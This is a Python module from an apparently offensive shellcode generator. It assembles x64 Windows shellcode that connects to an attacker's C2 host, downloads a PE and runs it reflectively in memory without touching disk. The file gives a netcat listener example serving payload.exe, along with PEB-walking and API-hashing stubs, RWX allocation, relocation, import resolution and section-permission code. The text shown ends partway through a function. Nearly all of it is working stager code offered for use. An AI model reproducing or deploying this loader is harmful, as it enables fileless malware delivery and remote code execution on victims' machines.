import sys
import math
import ctypes
import struct

import sickle.common.lib.generic.extract as extract
import sickle.common.lib.generic.convert as convert
import sickle.common.lib.generic.mparser as modparser
import sickle.common.lib.programmer.builder as builder

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.headers.windows import (
    winnt,
    ntdef,
    ws2def,
    winternl
)

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) Reflective PE Loader"

    module = f"{platform}/{arch}/reflective_pe_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)"]

    summary = ("TCP-based reflective PE loader over IPV4 which executes a PE from a"
               " remote server")

    description = f"""
    TCP based reflective PE loader over IPV4 that will connect to a remote C2 server
    and download a PE. Once downloaded, the PE will be executed in memory without
    touching disk.

    As an example, you \"C2 Server\" can be as simple as Netcat:

        nc -w 15 -lvp 42 < payload.exe

    Then you can generate the shellcode accordingly:

        {example_run}

    Upon execution of the shellcode, you should get a connection from the target and
    your PE should execute in memory.
    """

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    arguments["ACKPK"] = {}
    arguments["ACKPK"]["optional"] = "yes"
    arguments["ACKPK"]["description"] = "File containing acknowledgement packet response"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch

        self.dependencies = {
            "Kernel32.dll": [
                "GetCurrentProcess",
                "LoadLibraryA",
                "VirtualAllocEx",
                "GetProcAddress",
                "VirtualProtectEx",
                "CreateRemoteThread",
                "WaitForSingleObject",
            ],
            "Ws2_32.dll" : [
                "WSAStartup",
                "socket",
                "connect",
                "send",
                "recv",
            ],
            "msvcrt.dll" : [
                "malloc",
                "realloc",
                "memset",
                "memcpy",
            ]
        }

        sc_args = builder.init_sc_args(self.dependencies)
        sc_args.update({
            "index"                         : 0x00,
            "wsaData"                       : 0x00,
            "sockaddr_name"                 : 0x00,
            "sockfd"                        : 0x00,
            "buffer"                        : self.get_ackpk_len(),
            "pResponse"                     : 0x00,
            "pTmpResponse"                  : 0x00,
            "bytesRead"                     : 0x00,
            "hProcess"                      : 0x00,
            "pNtHeader"                     : 0x00,
            "lpvLoadedAddress"              : 0x00,
            "dwOffsetToBaseRelocationTable" : 0x00,
            "pHeaderSection"                : 0x00,
            "dwTableSize"                   : 0x00,
            "pBaseRelocationTable"          : 0x00,
            "dwBlockSize"                   : 0x00,
            "pwRelocEntry"                  : 0x00,
            "numEntries"                    : 0x00,
            "dwBlockIndex"                  : 0x00,
            "dwAddressOffset"               : 0x00,
            "lpvPreferableBase"             : 0x00,
            "dwImportsOffset"               : 0x00,
            "lpImportData"                  : 0x00,
            "szDllName"                     : 0x00,
            "hLibraryHandle"                : 0x00,
            "dwFThunk"                      : 0x00,
            "lpApiImport"                   : 0x00,
            "stWrittenBytes"                : 0x00,
            "lpSectionHeaderArray"          : 0x00,
            "dwSectionMappedSize"           : 0x00,
            "dwSectionProtection"           : 0x00,
            "dwSecIndex"                    : 0x00,
        })

        self.stack_space = builder.calc_stack_space(sc_args, Shellcode.arch)
        self.storage_offsets = builder.gen_offsets(sc_args, Shellcode.arch)

        return

    def get_ackpk_len(self):
        """Generates the size needed by the ACK packet sent to C2
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("ACKPK" not in argv_dict.keys()):
            self.ack_packet = "The Only Thing They Fear Is You\r\n"
        else:
            self.ack_packet = extract.read_bytes_from_file(argv_dict["ACKPK"], 'r')

        needed_space = math.ceil(len(self.ack_packet)/8) * 8

        return needed_space

    def modify_section_perms(self):
        """Modify permissions for each section
        """

        stub = f"""
get_lpSectionHeaderArray:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}
    mov r11d, [rdx]
    mov rdx, r11
    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
    add rcx, rdx
    add rcx, {ctypes.sizeof(winnt._IMAGE_NT_HEADERS64)}
    mov [rbp - {self.storage_offsets['lpSectionHeaderArray']}], rcx

init_dwSecIndex:
    xor rax, rax
    mov [rbp - {self.storage_offsets['dwSecIndex']}], rax

copy_section:
    mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]   
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r11d, [rdx]
    xor r14, r14
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
    mov r14d, [rdx]
    xor r13, r13
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.SizeOfRawData.offset}
    mov r13d, [rdx]
    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    add rcx, r11
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, r14
    mov r8, r13
    mov rax, [rbp - {self.storage_offsets['memcpy']}]
    call rax

get_mapped_section_size:
    xor rax, rax
    mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], rax
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.FileHeader.offset}
    add rdx, {winnt._IMAGE_FILE_HEADER.NumberOfSections.offset}
    mov ax, [rdx]
    dec al
    mov rcx, [rbp - {self.storage_offsets['dwSecIndex']}]
    cmp rcx, rax
    jne next_section

last_section:
    xor rcx, rcx
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov ecx, [rdx]
    xor rdx, rdx
    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov edx, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfImage.offset}]
    sub rdx, rcx
    mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], rdx
    jmp page_execute_read_write

next_section:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r11d, [rdx]
    xor r12, r12
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r12d, [rdx]
    sub r11, r12
    mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], r11

page_execute_read_write:  
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.Characteristics.offset}
    mov r11d, [rdx]
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_execute_read
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_execute_read
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_execute_read
    mov r12, {winnt.PAGE_EXECUTE_READWRITE}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_execute_read:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_execute_writecopy
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_execute_writecopy
    mov r12, {winnt.PAGE_EXECUTE_READ}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_execute_writecopy:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_readwrite
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_readwrite
    mov r12, {winnt.PAGE_EXECUTE_WRITECOPY}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_readwrite:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_execute
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_execute
    mov r12, {winnt.PAGE_READWRITE}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_execute:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_EXECUTE}
    jz page_readonly
    mov r12, {winnt.PAGE_EXECUTE}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12

    jmp change_perm

page_readonly:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_READ}
    jz page_writecopy
    mov r12, {winnt.PAGE_READONLY}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_writecopy:
    mov r12, r11
    and r12d, {winnt.IMAGE_SCN_MEM_WRITE}
    jz page_noaccess
    mov r12, {winnt.PAGE_WRITECOPY}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12
    jmp change_perm

page_noaccess:
    mov r12, {winnt.PAGE_NOACCESS}
    mov [rbp - {self.storage_offsets['dwSectionProtection']}], r12

change_perm:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    mov r11d, [rdx]
    mov rdx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    add rdx, r11
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    mov r8, [rbp - {self.storage_offsets['dwSectionMappedSize']}]
    mov r9, [rbp - {self.storage_offsets['dwSectionProtection']}]
    sub rsp, 0x20
    lea r11, [rbp - {self.storage_offsets['buffer']}]
    mov [rsp+0x20], r11
    mov rax, [rbp - {self.storage_offsets['VirtualProtectEx']}]
    call rax
    add rsp, 0x20

check_next_section:
    mov rcx, [rbp - {self.storage_offsets['dwSecIndex']}]
    inc cl
    mov [rbp - {self.storage_offsets['dwSecIndex']}], rcx
    mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_SECTION_HEADER)}
    mov [rbp - {self.storage_offsets['lpSectionHeaderArray']}], rdx
    xor r9, r9
    mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
    add r8, {winnt._IMAGE_NT_HEADERS64.FileHeader.offset}
    mov r9w, [r8 + {winnt._IMAGE_FILE_HEADER.NumberOfSections.offset}]
    cmp rcx, r9
    jl copy_section
        """

        return stub

    def write_headers(self):
        """Write the headers into the newly allocated region
        """

        stub = f"""
copy_to_alloc:
    xor r8, r8
    mov rax, [rbp - {self.storage_offsets['memcpy']}]
    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov r8d, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    call rax

change_permissions:
    xor rdx, rdx
    mov r11, [rbp - {self.storage_offsets['pNtHeader']}]
    add r11, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov edx, [r11 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfHeaders.offset}]
    mov rax, [rbp - {self.storage_offsets['VirtualProtectEx']}]
    mov r8, rdx
    mov rdx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    mov r11, rsp
    add rsp, 0x28
    mov [rsp+0x20], r11
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    mov r9, {winnt.PAGE_READONLY}
    call rax
        """

        return stub

    def load_imports(self):
        """Load functions imported
        """

        stub = f"""
get_dwImportsOffset:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_IMPORT}
    imul rax,{ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
    add rdx, rax
    xor rax, rax
    mov ax, [rdx]
    mov r11, rax
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov [rbp - {self.storage_offsets['dwImportsOffset']}], rax

get_lpImportData:
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rax
    mov [rbp - {self.storage_offsets['lpImportData']}], rdx

parse_imports:
    mov rdx, [rbp - {self.storage_offsets['lpImportData']}]

get_szDllName:
    xor r11, r11
    add rdx, {winnt._IMAGE_IMPORT_DESCRIPTOR.Name.offset}
    mov r11d, [rdx]
    cmp r11, 0x00
    je check_dll_done
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]

get_hLibraryHandle:
    add rdx, rax 
    mov rcx, rdx
    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
    call rax
    mov [rbp - {self.storage_offsets['hLibraryHandle']}], rax

get_dwFThunk:
    xor r11, r11
    mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
    add rdx, {winnt._IMAGE_IMPORT_DESCRIPTOR.FirstThunk.offset}
    mov r11d, [rdx]
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rax
    mov [rbp - {self.storage_offsets['dwFThunk']}], rdx

get_lpApiImport:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
    mov r11, [rdx]
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rax
    mov [rbp - {self.storage_offsets['lpApiImport']}], rdx

get_lpApiAddress:
    add rdx, {winnt._IMAGE_IMPORT_BY_NAME.Name.offset}
    mov rcx, [rbp - {self.storage_offsets['hLibraryHandle']}]
    mov rax, [rbp - {self.storage_offsets['GetProcAddress']}]
    call rax

write_address:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
    mov [rdx], rax

load_next_entry:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {ctypes.sizeof(ctypes.c_uint64)}
    mov [rbp - {self.storage_offsets['dwFThunk']}], rdx

check_next_done:
    mov rdx, [rbp - {self.storage_offsets['dwFThunk']}]
    add rdx, {winnt._IMAGE_THUNK_DATA64.u1.offset}
    mov rdx, [rdx]
    cmp rdx, 0x00
    jne get_lpApiImport

next_dll:
    mov rdx, [rbp - {self.storage_offsets['lpImportData']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_IMPORT_DESCRIPTOR)}
    mov [rbp - {self.storage_offsets['lpImportData']}], rdx

check_dll_done:
    xor r11, r11
    add rdx, {winnt._IMAGE_IMPORT_DESCRIPTOR.Name.offset}
    mov r11d, [rdx]
    cmp r11, 0x00
    jne parse_imports
        """

        return stub


    def rva_to_offset(self):
        """Converts the RVA to a physical location within the PE
        """

        stub = f"""
rva2offset:
    push rbp
    mov rbp, rsp
    sub rsp, 0x10

    mov [rbp - 0x08], rcx
    mov [rbp - 0x10], r11

    xor r9, r9
    mov r8, rcx
    add r8, {winnt._IMAGE_NT_HEADERS64.FileHeader.offset}
    mov r9w, [r8 + {winnt._IMAGE_FILE_HEADER.NumberOfSections.offset}]
    add rcx, 0x108
    mov [rbp - 0x08], rcx
    xor rdi, rdi

loop:
    mov rcx, [rbp - 0x08]
    xor rax, rax
    xor rbx, rbx
    mov rax, 0x28
    mul rdi

    add rcx, rax
    mov r8, rcx
    mov r12, r8
    add rcx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
    add r8, {winnt._IMAGE_SECTION_HEADER.Misc.offset}
    mov ax, [rcx]
    cmp r11, rax
    jge in_range
    jmp not_in_range

in_range:
    mov bx, [r8]
    add rbx, rax
    cmp r11, rbx
    jl calc_offset

not_in_range:
    inc rdi
    cmp rdi, r9
    jl loop
    jmp calc_offset

next_entry:
    jmp loop

calc_offset:
    add r12, {winnt._IMAGE_SECTION_HEADER.PointerToRawData.offset}
    mov r12, [r12]
    add r12, r11
    sub r12, rax
    mov rax, r12

    leave
    ret
        """

        return stub

    def rebase_pe(self):
        """Rebase the PE to be loaded from memory
        """

        stub = f"""
change_ImageBase:
    mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
    add r8, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov rcx, [rbp - {self.storage_offsets["lpvLoadedAddress"]}]
    mov rdx, [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.ImageBase.offset}]
    mov [rbp - {self.storage_offsets["lpvPreferableBase"]}], rdx
    mov [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.ImageBase.offset}], rcx

; RAX = rva2offset(PIMAGE_NT_HEADERS64 pNtHeader, // RCX => pNtHeader
;                  DWORD dwVA);                   // R11 => pNtHeader->OptionalHeader.DataDirectory[winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
get_dwOffsetToBaseRelocationTable:
    xor rdx, rdx
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
    imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
    add rdx, rax
    xor rax, rax
    mov ax, [rdx]
    mov r11, rax
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    call rva2offset
    mov [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}], rax

get_dwTableSize:
    mov rdx, [rbp - {self.storage_offsets['pNtHeader']}]
    add rdx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    add rdx, {winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    mov rax, {winnt.IMAGE_DIRECTORY_ENTRY_BASERELOC}
    imul rax, {ctypes.sizeof(winnt._IMAGE_DATA_DIRECTORY)}
    add rdx, rax
    xor rcx, rcx
    mov cx, [rdx + {winnt._IMAGE_DATA_DIRECTORY.Size.offset}]
    mov [rbp - {self.storage_offsets['dwTableSize']}], rcx

get_pBaseRelocationTable:
    mov rcx, [rbp - {self.storage_offsets['dwOffsetToBaseRelocationTable']}]
    mov rdx, [rbp - {self.storage_offsets['pResponse']}]
    add rdx, rcx
    mov [rbp - {self.storage_offsets['pBaseRelocationTable']}], rdx

get_dwBlockSize:
    xor rcx, rcx
    mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    add rdx, {winnt._IMAGE_BASE_RELOCATION.SizeOfBlock.offset}
    mov cx, [rdx]
    mov [rbp - {self.storage_offsets['dwBlockSize']}], rcx

get_pwRelocEntry:
    mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    add rdx, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
    mov [rbp - {self.storage_offsets['pwRelocEntry']}], rdx

get_numEntries:
    mov rax, [rbp - {self.storage_offsets['dwBlockSize']}]
    sub rax, {ctypes.sizeof(winnt._IMAGE_BASE_RELOCATION)}
    shr rax, 1
    imul rax, {ctypes.sizeof(ctypes.c_uint16)}
    mov [rbp - {self.storage_offsets['numEntries']}], rax
    xor rax, rax

process_entries:
    mov [rbp - {self.storage_offsets['dwBlockIndex']}], rax

get_wBlockType:
    xor rcx, rcx
    xor rbx, rbx
    mov rax, [rbp - {self.storage_offsets['dwBlockIndex']}]
    mov rdx, [rbp - {self.storage_offsets['pwRelocEntry']}]
    add rdx, rax

get_wBlockOffset:
    mov cx, [rdx]
    mov bx, cx
    shr rcx, 0x0C
    and bx, 0x0fff

check_x64:
    cmp rcx, {winnt.IMAGE_REL_BASED_DIR64}
    jne init_next_entry

get_dwAddressOffset:
    xor rax, rax
    mov rcx, [rbp - {self.storage_offsets['pNtHeader']}]
    mov r11, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    mov ax, [r11]
    add rax, rbx
    mov r11, rax
    call rva2offset
    mov r12, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    mov rbx, [rbp - {self.storage_offsets['lpvPreferableBase']}]
    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
    add rcx, rax
    mov rax, rcx
    mov rcx, [rcx]
    sub [rax], rbx
    add [rax], r12

init_next_entry:
    mov rax, [rbp - {self.storage_offsets['dwBlockIndex']}]
    add rax, {ctypes.sizeof(ctypes.c_uint16)}
    mov [rbp - {self.storage_offsets['dwBlockIndex']}], rax
    mov rcx, [rbp - {self.storage_offsets['numEntries']}]
    cmp rax, rcx
    jl process_entries

no_reloc:
    mov rdx, [rbp - {self.storage_offsets['pBaseRelocationTable']}]
    mov rcx, [rbp - {self.storage_offsets['dwBlockSize']}]
    add rdx, rcx
    mov [rbp - {self.storage_offsets['pBaseRelocationTable']}], rdx
    mov rdx, [rbp - {self.storage_offsets['dwTableSize']}]
    sub rdx, rcx
    mov [rbp - {self.storage_offsets['dwTableSize']}], rdx
    cmp rdx, 0
    jg get_dwBlockSize
        """

        return stub

    def alloc_image_space(self):
        """Create the allocation where the PE will loaded
        """

        stub = f"""
call_GetCurrentProcess:
    mov rax, [rbp - {self.storage_offsets['GetCurrentProcess']}]
    call rax
    mov [rbp - {self.storage_offsets['hProcess']}], rax

alloc_pe_home:
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    xor rdx, rdx
    mov r8, [rbp - {self.storage_offsets['pResponse']}]
    mov dx, [r8 + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    mov r8, [rbp - {self.storage_offsets['pResponse']}] 
    add r8, rdx
    mov [rbp - {self.storage_offsets['pNtHeader']}], r8
    add r8, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    xor rdx, rdx
    mov edx, [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.SizeOfImage.offset}]
    mov r8, rdx
    mov r9, {winnt.PAGE_EXECUTE_READWRITE}
    mov [rsp + 0x20], r9
    xor r9, r9
    add r9, {winnt.MEM_COMMIT + winnt.MEM_RESERVE}
    xor rdx, rdx
    mov rax, [rbp - {self.storage_offsets['VirtualAllocEx']}]
    call rax
    mov [rbp - {self.storage_offsets['lpvLoadedAddress']}], rax
        """

        return stub

    def download_pe(self):
        """Stager responsible for downloading the PE into memory
        """

        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])

        sock_buffer_size = 0x1000

        stub = f"""
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
    call rax

call_socket:
    mov rcx, {ws2def.AF_INET}
    xor rdx, rdx
    inc dl
    xor r8, r8
    mov rax, [rbp - {self.storage_offsets['socket']}]
    call rax
    mov [rbp - {self.storage_offsets['sockfd']}], rax

call_connect:
    mov rcx, rax
    mov r8, {ctypes.sizeof(ws2def.sockaddr)}
    lea rdx, [rbp - {self.storage_offsets['sockaddr_name']}]
    mov r9, {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 0x08], r9
    mov rax, [rbp - {self.storage_offsets['connect']}]
    call rax
"""

        packet_buffer = convert.from_str_to_xwords(self.ack_packet)
        write_index = self.storage_offsets['buffer']

        stub += f"\ncall_send:\n"

        for i in range(len(packet_buffer["QWORD_LIST"])):
            stub += "    mov rcx, 0x{}\n".format( struct.pack('<Q', packet_buffer["QWORD_LIST"][i]).hex() )
            stub += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(packet_buffer["DWORD_LIST"])):
            stub += "    mov ecx, 0x{}\n".format( struct.pack('<L', packet_buffer["DWORD_LIST"][i]).hex() ) 
            stub += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(packet_buffer["WORD_LIST"])):
            stub += "    mov cx, 0x{}\n".format( struct.pack('<H', packet_buffer["WORD_LIST"][i]).hex() )
            stub += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(packet_buffer["BYTE_LIST"])):
            stub += "    mov cl, {}\n".format( hex(packet_buffer["BYTE_LIST"][i]) )
            stub += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1


        stub += f"""
    xor rcx, rcx
    mov [rbp-{write_index}], cl
    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
    lea rdx, [rbp - {self.storage_offsets['buffer']}]
    mov r8, {len(self.ack_packet)}
    xor r9, r9
    mov rax, [rbp - {self.storage_offsets['send']}]
    call rax

allocate_main_buffer:
    mov rcx, {sock_buffer_size}
    mov rax, [rbp - {self.storage_offsets['malloc']}]
    call rax
    mov [rbp - {self.storage_offsets['pResponse']}], rax
        
allocate_tmp_buffer:
    mov rcx, {sock_buffer_size}
    mov rax, [rbp - {self.storage_offsets['malloc']}]
    call rax
    mov [rbp - {self.storage_offsets['pTmpResponse']}], rax

init_index:
    xor rax, rax
    mov [rbp - {self.storage_offsets['index']}], rax

download_stager:
    nop

call_memset:
    mov rcx, [rbp - {self.storage_offsets['pTmpResponse']}]
    xor rdx, rdx
    mov r8, {sock_buffer_size}
    mov rax, [rbp - {self.storage_offsets['memset']}]
    call rax

call_recv:
    mov rcx, [rbp - {self.storage_offsets['sockfd']}]
    mov rdx, [rbp - {self.storage_offsets['pTmpResponse']}]
    mov r8, {sock_buffer_size}
    xor r9, r9
    mov rax, [rbp - {self.storage_offsets['recv']}]
    call rax
    mov [rbp - {self.storage_offsets['bytesRead']}], rax

check_write:
    test rax, rax
    jle download_complete

fruit_loop:
    mov r10, [rbp - {self.storage_offsets['index']}]
    mov rcx, [rbp - {self.storage_offsets['bytesRead']}]
    mov rbx, [rbp - {self.storage_offsets['pResponse']}]
    mov rax, [rbp - {self.storage_offsets['pTmpResponse']}]
    add rbx, r10
write_data:
    mov dl, [rax]
    mov [rbx], dl
    inc r10
    inc rbx
    inc rax
    dec rcx
    mov [rbp - {self.storage_offsets['index']}], r10
    test rcx, rcx
    jnz write_data

check_realloc:
    mov rcx, [rbp - {self.storage_offsets['bytesRead']}]
    test rcx, rcx
    jle download_complete

realloc:
    mov rax, [rbp - {self.storage_offsets['realloc']}]
    mov rcx, [rbp - {self.storage_offsets['pResponse']}]
    mov rdx, [rbp - {self.storage_offsets['index']}]
    add rdx, {sock_buffer_size}
    call rax
    mov [rbp - {self.storage_offsets['pResponse']}], rax
    jmp download_stager

download_complete:
    nop
        """

        return stub

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        stub = f"""
getKernel32:
    push rbp
    mov rbp, rsp
    mov dl, 0x4b
getPEB:
    mov rcx, 0x60
    mov r8, gs:[rcx]
getHeadEntry:
    mov rdi, [r8 + {winternl._PEB.Ldr.offset}]
    mov rdi, [rdi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    xor rcx, rcx
    mov rax, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    mov rsi, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search
found:
    leave
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = f"""
lookupFunction:
    push rbp
    mov rbp, rsp
    mov ebx, [rdi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
    add rbx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    add rbx, rdi
    mov eax, [rbx]
    mov rbx, rdi
    add rbx, rax
    mov eax, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov r8, rdi
    add r8, rax
    mov rcx, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
parseNames:
    jecxz error
    dec ecx
    mov eax, [r8 + rcx * 4]
    mov rsi, rdi
    add rsi, rax
    xor r9, r9
    xor rax, rax
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror r9d, 0xD
    add r9, rax
    jmp calcHash
calcDone:
    cmp r9d, edx
    jnz parseNames
findAddress:
    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add r8, rdi
    xor rax, rax
    mov ax, [r8 + rcx * 2]
    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add r8, rdi
    mov eax, [r8 + rax * 4]
